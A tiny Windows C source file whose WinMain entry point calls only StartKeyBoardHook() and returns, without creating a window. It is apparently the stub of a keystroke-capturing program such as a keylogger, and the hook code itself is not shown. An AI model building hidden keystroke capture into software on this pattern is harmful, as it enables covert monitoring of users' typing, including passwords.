#include "header.h"

int WINAPI WinMain(HINSTANCE hThisInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpszArgument,
					int nCmdShow)
{
	StartKeyBoardHook();
	return 0;
}